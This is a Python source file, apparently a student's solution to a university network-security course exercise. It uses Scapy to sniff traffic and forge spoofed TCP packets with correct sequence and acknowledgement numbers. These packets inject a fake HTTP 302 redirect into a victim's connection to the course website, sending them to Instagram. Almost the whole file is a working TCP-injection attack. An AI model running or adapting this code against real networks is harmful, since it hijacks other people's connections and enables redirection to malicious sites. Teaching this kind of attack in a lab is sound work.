import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    # just in case - use try except block to avoid crashing 
    try: 

        # make sure there is a Raw layer in the packet (that contains the HTTP requests)
        if(S.Raw not in packet):
            return None


         # make sure there are the IP and TCP layers in the packet 
        if((S.IP not in packet) or (S.TCP not in packet)):
            return None


        # make sure that the packet is an attempt to access the course website 
        if(("Host: " + WEBSITE) not in (packet[S.Raw].load).decode("latin-1")):
            return None
        

        # get the relevent layers 
        packet_ip_layer = packet[S.IP] 
        packet_tcp_layer = packet[S.TCP] 

        # build the packet that we will inject
        # the packet's source and destination IPs should be reversed as we send a
        # packet back to the victim
        injection_packet = S.IP(src=packet_ip_layer.dst, dst=packet_ip_layer.src) 

        # reverse the source and destination ports and put the correct ack and seq 
        # numbers into the packet, set the flags for acknowleging previous packets and closing the connection 
        injection_packet = injection_packet / \
                           S.TCP(sport=packet_tcp_layer.dport, \
                                 dport=packet_tcp_layer.sport, \
                                 seq=packet_tcp_layer.ack,     \
                                 ack=packet_tcp_layer.seq+len(packet_tcp_layer.payload), \
                                 flags="AF") 

        # add the RESPONSE to the packet, so the victim will be redirected from the course's website 
        injection_packet = injection_packet /  S.Raw(load=RESPONSE)

        return injection_packet

    except Exception: 
        return None 


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
